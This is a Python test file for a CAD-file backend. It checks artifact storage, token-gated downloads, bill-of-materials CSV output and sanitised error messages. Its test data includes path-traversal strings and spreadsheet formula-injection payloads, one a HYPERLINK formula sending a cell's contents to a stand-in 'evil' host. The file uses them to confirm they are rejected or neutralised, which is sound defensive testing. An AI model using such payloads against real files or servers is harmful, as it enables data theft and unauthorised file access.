"""Tests for CAD-file delivery, the BOM and user-facing failure text.

Ported from PR #4 (b6a61d7 + f9a14a1) and adapted to this branch's design:
delivered files are the *accepted* STEP/GLB bytes captured by
``verification.acceptance`` (never a re-execution), and downloads sit behind
the MIRUM_ACCESS_TOKEN gate.

Dropped from the original: the cosmetic-thread / nut-bore assertions
(cad_utils here already has representation='preview'|'envelope' and
``verification.fasteners`` labelling), the /run default tests (they depended on
MIRUM_API_KEY auth), and the STL artifact tests (STL is not offered).

    python -m pytest backend/tests/test_me_readiness.py
"""

import os
import pathlib
import sys
import types

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))
os.environ.setdefault("GEMINI_API_KEY_HEAVY", "test-key")

import artifacts  # noqa: E402


@pytest.fixture(autouse=True)
def _isolated_runs_root(tmp_path, monkeypatch):
    """Keep every artifact test inside a throwaway runs root."""
    monkeypatch.setattr(artifacts, "_RUNS_DIR", tmp_path / "runs")
    (tmp_path / "runs").mkdir()


# ---------------------------------------------------------------------------
# Artifact store
# ---------------------------------------------------------------------------

def test_run_id_is_validated_against_traversal():
    for bad in ("..", "../etc", "a/b", "", "zz" * 16, "../" * 4 + "etc", None, 7):
        assert artifacts.run_dir(bad) is None, bad
        assert artifacts.artifact_path(bad, "step") is None


def test_valid_run_id_resolves_under_the_runs_root():
    run_id = artifacts.new_run_id()
    path = artifacts.run_dir(run_id)
    assert path is not None
    assert path.parent == artifacts._RUNS_DIR.resolve()
    assert path.name == run_id


def test_unknown_format_is_rejected():
    run_id = artifacts.new_run_id()
    assert artifacts.artifact_path(run_id, "sldprt") is None
    assert artifacts.artifact_path(run_id, "../../etc/passwd") is None
    assert artifacts.artifact_path(run_id, "stl") is None


def test_step_is_offered_and_named_for_cad():
    assert "step" in artifacts.FORMATS
    filename, mime = artifacts.FORMATS["step"]
    assert filename.endswith(".step")
    assert "step" in mime


def test_dxf_and_stl_are_not_advertised():
    assert "dxf" not in artifacts.FORMATS
    assert "stl" not in artifacts.FORMATS


def test_available_reports_only_files_that_exist():
    run_id, run_path = artifacts.create_run()
    assert artifacts.available(run_id) == {"step": False, "glb": False}
    (run_path / artifacts.FORMATS["step"][0]).write_text("ISO-10303-21;")
    avail = artifacts.available(run_id)
    assert avail["step"] is True and avail["glb"] is False
    # A zero-byte file is not a usable download.
    (run_path / artifacts.FORMATS["glb"][0]).write_bytes(b"")
    assert artifacts.available(run_id)["glb"] is False


def test_discard_removes_the_run():
    run_id, run_path = artifacts.create_run()
    (run_path / "model.step").write_text("x")
    artifacts.discard(run_id)
    assert not run_path.exists()


def test_sweep_removes_only_expired_runs():
    fresh_id, fresh = artifacts.create_run()
    old_id, old = artifacts.create_run()
    (fresh / "model.step").write_text("x")
    (old / "model.step").write_text("x")
    os.utime(old, (0, 0))          # epoch: far older than any TTL
    artifacts.sweep(ttl_seconds=3600)
    assert fresh.exists(), "a fresh run must survive the sweep"
    assert not old.exists(), "an expired run must be removed"


def test_sweep_ignores_entries_that_are_not_run_ids():
    stray = artifacts._RUNS_DIR / "not-a-run"
    stray.mkdir()
    os.utime(stray, (0, 0))
    artifacts.sweep(ttl_seconds=3600)
    assert stray.exists()


def test_run_id_regex_rejects_trailing_newline():
    """`$` also matches before a trailing newline; fullmatch does not."""
    assert not artifacts.is_valid_run_id("a" * 32 + "\n")
    assert artifacts.is_valid_run_id("a" * 32)


def test_artifact_path_is_contained_even_for_valid_ids():
    run_id = artifacts.new_run_id()
    path = artifacts.artifact_path(run_id, "step")
    assert path is not None
    path.relative_to(artifacts._RUNS_DIR.resolve())


def test_artifact_path_rejects_a_symlink_escaping_the_root(tmp_path):
    run_id, run_path = artifacts.create_run()
    outside = tmp_path / "outside.step"
    outside.write_text("secret")
    link = run_path / artifacts.FORMATS["step"][0]
    try:
        link.symlink_to(outside)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks unavailable on this platform")
    assert artifacts.artifact_path(run_id, "step") is None
    assert artifacts.available(run_id)["step"] is False


def test_create_run_does_not_rely_on_assert():
    """Bare asserts vanish under `python -O`; this guard must survive."""
    import inspect
    src = inspect.getsource(artifacts.create_run)
    assert "assert " not in src
    assert "raise RuntimeError" in src


def test_publish_stores_the_exact_accepted_bytes():
    accepted = {"glb": b"glTF-accepted", "step": b"ISO-10303-21;accepted",
                "geometry_certificate": {"passed": True}}
    run_id, downloads = artifacts.publish(accepted)
    assert downloads == {"step": True, "glb": True}
    assert artifacts.artifact_path(run_id, "step").read_bytes() == accepted["step"]
    assert artifacts.artifact_path(run_id, "glb").read_bytes() == accepted["glb"]


def test_publish_with_nothing_usable_leaves_no_run_behind():
    run_id, downloads = artifacts.publish({"glb": b"", "step": None})
    assert run_id == "" and not any(downloads.values())
    assert list(artifacts._RUNS_DIR.iterdir()) == []


# ---------------------------------------------------------------------------
# /download endpoint
# ---------------------------------------------------------------------------

@pytest.fixture
def client(monkeypatch):
    from fastapi.testclient import TestClient
    import main
    monkeypatch.setattr(main.limiter, "enabled", False)
    monkeypatch.delenv("MIRUM_ACCESS_TOKEN", raising=False)
    with TestClient(main.app) as test_client:
        yield test_client


def test_download_serves_published_step(client):
    run_id, _ = artifacts.publish({"glb": b"glb-bytes", "step": b"step-bytes"})
    resp = client.get(f"/download/{run_id}/step")
    assert resp.status_code == 200
    assert resp.content == b"step-bytes"
    assert "model.step" in resp.headers["content-disposition"]


def test_download_rejects_bad_ids_formats_and_missing_files(client):
    run_id, _ = artifacts.publish({"glb": b"g", "step": b"s"})
    assert client.get("/download/not-a-run-id/step").status_code == 404
    assert client.get(f"/download/{run_id}/stl").status_code == 404
    assert client.get(f"/download/{run_id}/..%2f..%2fetc").status_code == 404
    missing = artifacts.new_run_id()
    assert client.get(f"/download/{missing}/step").status_code == 404


def test_download_is_behind_the_access_token_gate(client, monkeypatch):
    run_id, _ = artifacts.publish({"glb": b"g", "step": b"s"})
    monkeypatch.setenv("MIRUM_ACCESS_TOKEN", "fixture-token")
    assert client.get(f"/download/{run_id}/step").status_code == 401
    ok = client.get(f"/download/{run_id}/step",
                    headers={"X-Mirum-Access-Token": "fixture-token"})
    assert ok.status_code == 200 and ok.content == b"s"


# ---------------------------------------------------------------------------
# Bill of materials
# ---------------------------------------------------------------------------

def _fake_manifest(parts):
    return types.SimpleNamespace(
        assembly_name="t",
        parts=[types.SimpleNamespace(part_id=p, description=d) for p, d in parts],
    )


def test_bom_collapses_identical_parts_into_quantities():
    from verification.bom import build_bom
    manifest = _fake_manifest([
        ("tabletop", "1200x800x25 tabletop"),
        ("leg_1", "60mm square leg"),
        ("leg_2", "60mm square leg"),
        ("leg_3", "60mm square leg"),
        ("leg_4", "60mm square leg"),
    ])
    certs = {"tabletop": {"mass_g": 9000.0}, "leg_1": {"mass_g": 500.0}}
    bom = build_bom(manifest, certs, material="aluminum")

    assert bom["total_parts"] == 5
    assert bom["unique_parts"] == 2
    legs = next(l for l in bom["lines"] if l["part_id"] == "leg_1")
    assert legs["quantity"] == 4
    assert legs["instances"] == ["leg_1", "leg_2", "leg_3", "leg_4"]
    assert legs["line_mass_g"] == pytest.approx(2000.0)
    assert bom["total_mass_g"] == pytest.approx(11000.0)


def test_bom_preserves_build_order():
    from verification.bom import build_bom
    manifest = _fake_manifest([("base", "a"), ("w1", "b"), ("top", "c"), ("w2", "b")])
    bom = build_bom(manifest, {})
    assert [l["part_id"] for l in bom["lines"]] == ["base", "w1", "top"]


def test_bom_total_is_none_when_any_mass_is_unknown():
    """Better no total than a total that silently omits parts."""
    from verification.bom import build_bom
    manifest = _fake_manifest([("a", "x"), ("b", "y")])
    bom = build_bom(manifest, {"a": {"mass_g": 10.0}, "b": None})
    assert bom["total_mass_g"] is None


def test_bom_csv_has_a_header_and_one_row_per_line():
    from verification.bom import build_bom
    manifest = _fake_manifest([("a", "x"), ("b", "y"), ("c", "y")])
    bom = build_bom(manifest, {}, material="steel")
    rows = [r for r in bom["csv"].splitlines() if r.strip()]
    assert rows[0].startswith("Item,Part ID,Qty")
    assert any(",2," in r for r in rows[1:]), "quantity 2 should appear for the pair"


def test_bom_empty_manifest_is_safe():
    from verification.bom import build_bom
    bom = build_bom(_fake_manifest([]), {})
    assert bom["lines"] == [] and bom["total_parts"] == 0


@pytest.mark.parametrize("payload", [
    "=HYPERLINK(\"http://evil/\"&A1,\"click\")",
    "+1+1",
    "-2+3",
    "@SUM(A1:A9)",
    "\tleading tab",
    "\rleading cr",
])
def test_bom_csv_neutralises_formula_injection(payload):
    """A BOM is made to be shared; descriptions are LLM output steered by the
    user's prompt, so a leading '='/'@' would execute on a colleague's machine."""
    import csv
    import io
    from verification.bom import to_csv
    csv_text = to_csv([{
        "part_id": payload, "quantity": 1, "material": payload,
        "mass_g": 1.0, "line_mass_g": 1.0,
        "instances": [payload], "description": payload,
    }])
    for row in list(csv.reader(io.StringIO(csv_text)))[1:]:
        for cell in row:
            assert not cell.startswith(("=", "+", "-", "@", "\t", "\r")), (
                f"unneutralised formula cell: {cell!r}"
            )


def test_bom_csv_leaves_ordinary_text_alone():
    from verification.bom import to_csv
    csv_text = to_csv([{
        "part_id": "leg_1", "quantity": 4, "material": "aluminum",
        "mass_g": 12.5, "line_mass_g": 50.0,
        "instances": ["leg_1"], "description": "60mm square leg",
    }])
    assert "leg_1" in csv_text and "'leg_1" not in csv_text


# ---------------------------------------------------------------------------
# What the user is told when generation fails
# ---------------------------------------------------------------------------

def test_user_facing_message_has_no_traceback_or_code():
    from failure_analysis import user_facing_failure
    msg = user_facing_failure("fillet", "bracket", 3)
    for leak in ("Traceback", "```", "cq.Workplane", "rule_", "system prompt",
                 "StdFail", "Failure class:"):
        assert leak not in msg, f"user-facing text leaked {leak!r}: {msg}"
    assert "bracket" in msg and "3 attempts" in msg


@pytest.mark.parametrize("cls", [
    "loft", "fillet", "shell", "boolean", "thread", "timeout", "syntax",
    "security", "dimension_mismatch", "geometry_cert", "export",
])
def test_every_common_failure_class_has_a_suggestion(cls):
    from failure_analysis import user_facing_failure
    msg = user_facing_failure(cls)
    assert msg.count(".") >= 2, f"{cls} has no suggestion sentence: {msg}"


def test_unknown_failure_class_still_says_something_useful():
    from failure_analysis import user_facing_failure
    assert "could not be generated" in user_facing_failure("something_new")


def test_script_error_carries_both_audiences():
    from agents import ScriptError
    exc = ScriptError("operator detail with Traceback", script="code",
                      user_message="Plain English.")
    assert exc.user_message == "Plain English."
    assert "Traceback" in str(exc)          # operator detail preserved
    assert exc.script == "code"
    assert ScriptError("x").user_message == ""


def test_pipeline_error_text_prefers_user_message_and_is_redacted():
    import main
    from agents import ScriptError
    exc = ScriptError("Traceback File \"/app/x.py\"", user_message="Plain English.")
    assert main._user_error(exc) == "Plain English."
    bare = ScriptError("boom at C:\\Users\\me\\secret.py")
    assert "secret.py" not in main._user_error(bare)


# ---------------------------------------------------------------------------
# Pipeline wiring: delivered STEP == accepted bytes; fail-closed is untouched
# ---------------------------------------------------------------------------

def _drive_pipeline(monkeypatch, cert_passed):
    import asyncio
    import json
    import main
    from schemas import AssemblyManifest, MatingRule, PartDefinition

    part = PartDefinition(part_id="plate", description="a 10mm plate",
                          anchor_tags=[">Z", "<Z"])
    manifest = AssemblyManifest(
        assembly_name="one_part",
        parts=[part],
        mating_rules=[MatingRule(source_part_id="plate", source_anchor=">Z",
                                 target_part_id="plate", target_anchor=">Z",
                                 translation="0, 0, 0", clearance=0.0)],
    )
    accepted = {
        "glb": b"glTF-accepted-bytes",
        "step": b"ISO-10303-21;ACCEPTED-STEP",
        "geometry_certificate": {
            "passed": cert_passed, "failures": [], "volume_mm3": 1000.0,
            "surface_area_mm2": 600.0, "bounding_box": {"x_mm": 10, "y_mm": 10, "z_mm": 10},
        },
    }

    async def _rea(_p):
        return None

    async def _planner(_p, requirements=None):
        return manifest

    async def _critic(p, **_kw):
        return "result = None", "", None

    async def _export(_code, _out, *_a):
        return "result = None"

    async def _accepted(script, output_path, var="auto"):
        with open(output_path, "wb") as fh:
            fh.write(accepted["glb"])
        return {"status": "success", "acceptance": accepted}

    monkeypatch.setattr(main, "run_rea", _rea)
    monkeypatch.setattr(main, "run_planner", _planner)
    monkeypatch.setattr(main, "run_critic_loop", _critic)
    monkeypatch.setattr(main, "run_single_part_export", _export)
    monkeypatch.setattr(main, "_execute_accepted", _accepted)
    monkeypatch.setattr(main, "parameterize_script", lambda s: (s, {}))

    async def _collect():
        events = []
        async for ev in main._pipeline("a plate"):
            events.append(ev)
        return events

    events = asyncio.run(_collect())
    final = json.loads(events[-1][len("data: "):])
    return final, accepted


def test_pipeline_delivers_the_accepted_step_bytes(monkeypatch):
    final, accepted = _drive_pipeline(monkeypatch, cert_passed=True)
    assert final["status"] == "done", final
    assert final["downloads"] == {"step": True, "glb": True}
    stored = artifacts.artifact_path(final["run_id"], "step").read_bytes()
    assert stored == accepted["step"]
    assert artifacts.artifact_path(final["run_id"], "glb").read_bytes() == accepted["glb"]


def test_pipeline_publishes_nothing_when_the_certificate_fails(monkeypatch):
    final, _ = _drive_pipeline(monkeypatch, cert_passed=False)
    assert final["status"] == "error"
    assert "run_id" not in final
    assert list(artifacts._RUNS_DIR.iterdir()) == []
